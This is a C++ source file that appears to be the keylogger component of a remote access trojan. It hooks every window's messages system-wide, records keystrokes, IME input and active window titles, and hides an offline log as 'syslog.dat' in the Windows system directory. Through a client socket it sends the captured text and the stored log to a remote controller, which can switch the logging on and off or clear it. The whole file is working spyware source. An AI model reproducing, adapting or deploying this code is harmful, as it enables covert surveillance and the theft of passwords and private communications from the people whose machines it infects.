// KeyboardManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#include "KeyboardManager.h"
#define	SIZE_IMM_BUFFER					100
#pragma comment(lib, "Imm32.lib")

bool g_bSignalHook = false;
typedef	struct
{
	DWORD	dwOffset;
	HHOOK	hGetMsgHook;
	HWND	hActWnd;	//current actived window
	bool	bIsOffline;
	char	strRecordFile[MAX_PATH];
	char	chKeyBoard[1024];
	char	str[SIZE_IMM_BUFFER];
	char	str2[SIZE_IMM_BUFFER];
}TShared;

#pragma data_seg(".shared")
TShared	g_Shared = {0};
#pragma data_seg()

HINSTANCE	CKeyboardManager::g_hInstance = NULL;
DWORD		CKeyboardManager::m_dwLastInput = GetTickCount();
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKeyboardManager::CKeyboardManager(CClientSocket *pClient) : CManager(pClient)
{
	g_bSignalHook = true;
	sendStartKeyBoard();
	Sleep(1000);
	sendOfflineRecord();
	int	dwOffset = g_Shared.dwOffset;
	

	while (m_pClient->IsRunning())
	{
		if (g_Shared.dwOffset != dwOffset)
		{
			UINT	nSize;
			if (g_Shared.dwOffset < dwOffset)
				nSize = g_Shared.dwOffset;
			else
				nSize = g_Shared.dwOffset - dwOffset;
			
			sendKeyBoardData((unsigned char *)&(g_Shared.chKeyBoard[dwOffset]), nSize);
			
			dwOffset = g_Shared.dwOffset;
		}
		Sleep(100);
	}

	if (!g_Shared.bIsOffline)
		g_bSignalHook = false;
}

CKeyboardManager::~CKeyboardManager()
{

}


void CKeyboardManager::SaveToFile(char *lpBuffer)
{
	HANDLE	hFile = CreateFile(g_Shared.strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	// 离线记录，小于50M
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, lpBuffer, lstrlen(lpBuffer), &dwBytesWrite, NULL);
	CloseHandle(hFile);	
}

void CKeyboardManager::SaveInfo(char *lpBuffer)
{
	DWORD	dwBytes = strlen(lpBuffer);

	if((dwBytes < 1) || (dwBytes > SIZE_IMM_BUFFER)) return;

	HWND hWnd = GetActiveWindow();

	if(hWnd != g_Shared.hActWnd)
	{
		g_Shared.hActWnd = hWnd;
		char strCapText[256];
		GetWindowText(g_Shared.hActWnd, strCapText, sizeof(strCapText));

		char strSaveString[1024 * 2];
		SYSTEMTIME	SysTime;
		GetLocalTime(&SysTime);
		memset(strSaveString, 0, sizeof(strSaveString));
		wsprintf
			(
			strSaveString,
			"\r\n[%02d/%02d/%d %02d:%02d:%02d] (%s)\r\n",
			SysTime.wMonth, SysTime.wDay, SysTime.wYear,
			SysTime.wHour, SysTime.wMinute, SysTime.wSecond,
			strCapText
			);
		// 让函认为是应该保存的
		SaveInfo(strSaveString);	
	}

	if (g_Shared.bIsOffline)
	{
		SaveToFile(lpBuffer);
	}

	// reset
	if ((g_Shared.dwOffset + dwBytes) > sizeof(g_Shared.chKeyBoard))
	{
		memset(g_Shared.chKeyBoard, 0, sizeof(g_Shared.chKeyBoard));
		g_Shared.dwOffset = 0;
	}
	lstrcat(g_Shared.chKeyBoard, lpBuffer);
	g_Shared.dwOffset += dwBytes;
}

LRESULT CALLBACK CKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSG* pMsg;
	HIMC hImg;
	HWND hWnd;
	LONG strLen;
	const char *pStr;
	char c;
	char cc[2];
	char KeyName[20];
	int size = 0;
	char * p = NULL;
	LRESULT result = CallNextHookEx(g_Shared.hGetMsgHook, nCode, wParam, lParam);

	if(nCode == HC_ACTION){
		pMsg = (MSG*)(lParam);
		pStr = NULL;
		if (((pMsg->message == WM_IME_COMPOSITION) || (pMsg->message == WM_CHAR)) && (GetTickCount() - m_dwLastInput) >= 50)
		{
			switch(pMsg->message){
			case WM_IME_COMPOSITION://imm input
				//if(lParam != GCS_RESULTSTR) break;
				hWnd = GetFocus();
				hImg = ImmGetContext(hWnd);
				strLen = ImmGetCompositionString(hImg, GCS_RESULTSTR,NULL,0);
				if((strLen < 2) || (strLen > SIZE_IMM_BUFFER - 10)) break;
				SecureZeroMemory(g_Shared.str, SIZE_IMM_BUFFER);
				strLen = ImmGetCompositionString(hImg, GCS_RESULTSTR, g_Shared.str, strLen);
				//ImmSetCompositionString(hImg,SCS_SETSTR, NULL, NULL, NULL, 0);
				ImmReleaseContext(hWnd, hImg);
				if(lstrcmp(g_Shared.str,g_Shared.str2) == 0) {//same input
					pStr = NULL;
					SecureZeroMemory(g_Shared.str2, SIZE_IMM_BUFFER);
					break;
				}
				lstrcpy(g_Shared.str2, g_Shared.str);
				if(strLen > 0){
					pStr = (LPCSTR)g_Shared.str;
				}
				break;
			case WM_CHAR://normal key
				if ((GetTickCount() - m_dwLastInput) < 40) {m_dwLastInput = GetTickCount(); break;}
				if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
				{
					cc[0] = pMsg->wParam;
					cc[1] = '\0';
					pStr = (const char*)(cc);
				}
				else if (pMsg->wParam == VK_RETURN)
				{
					pStr = "\r\n";
				}
				// 控制字符
				else
				{
					memset(KeyName, 0, sizeof(KeyName));
					if (GetKeyNameText(pMsg->lParam, &(KeyName[1]), sizeof(KeyName) - 2) > 0)
					{
						KeyName[0] = '[';
						strcat(KeyName, "]");
						pStr = KeyName;
					}
					else
						pStr = NULL;
				}
				break;
			default:
				pStr = NULL;
				break;
			}
			if(pStr != NULL) SaveInfo((char *)pStr);
			m_dwLastInput = GetTickCount();
		}
	}
	return result;
}


void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE)
	{
		g_Shared.bIsOffline = !g_Shared.bIsOffline;
		if (!g_Shared.bIsOffline)
			DeleteFile(g_Shared.strRecordFile);
		else if (GetFileAttributes(g_Shared.strRecordFile) == INVALID_FILE_ATTRIBUTES)
		{
			HANDLE hFile = CreateFile(g_Shared.strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			CloseHandle(hFile);
		}
	}
	if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR && g_Shared.bIsOffline)
	{
		HANDLE hFile = CreateFile(g_Shared.strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(hFile);
	}
}

bool CKeyboardManager::StartHook()
{
	m_dwLastInput = GetTickCount();
	memset(&g_Shared, 0, sizeof(g_Shared));
	g_Shared.hActWnd = NULL;
	g_Shared.hGetMsgHook = NULL;
	g_Shared.dwOffset = 0;
	
	SecureZeroMemory(g_Shared.str, sizeof(g_Shared.str));
	SecureZeroMemory(g_Shared.str2, sizeof(g_Shared.str2));


	GetSystemDirectory(g_Shared.strRecordFile, sizeof(g_Shared.strRecordFile));
	lstrcat(g_Shared.strRecordFile, "\\syslog.dat");

	if (GetFileAttributes(g_Shared.strRecordFile) != INVALID_FILE_ATTRIBUTES)
		g_Shared.bIsOffline = true;
	else
		g_Shared.bIsOffline = false;

	if (g_Shared.hGetMsgHook == NULL)
	{
		g_Shared.hGetMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, g_hInstance, 0);
	}
	
	return true;
}

void CKeyboardManager::StopHook()
{
	if (g_Shared.hGetMsgHook != NULL)
		UnhookWindowsHookEx(g_Shared.hGetMsgHook);
	g_Shared.hGetMsgHook = NULL;

}
int CKeyboardManager::sendStartKeyBoard()
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	bToken[1] = (BYTE)g_Shared.bIsOffline;

	return Send((LPBYTE)&bToken[0], sizeof(bToken));	
}

int CKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	int nRet = -1;
	DWORD	dwBytesLength = 1 + nSize;
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	memcpy(lpBuffer + 1, lpData, nSize);
	
	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	LocalFree(lpBuffer);
	return nRet;	
}

int CKeyboardManager::sendOfflineRecord()
{
	int		nRet = 0;
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
	char	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\syslog.dat");
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwSize = GetFileSize(hFile, NULL);
		char *lpBuffer = new char[dwSize];
		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
		delete lpBuffer;
	}
	CloseHandle(hFile);
	return nRet;
}
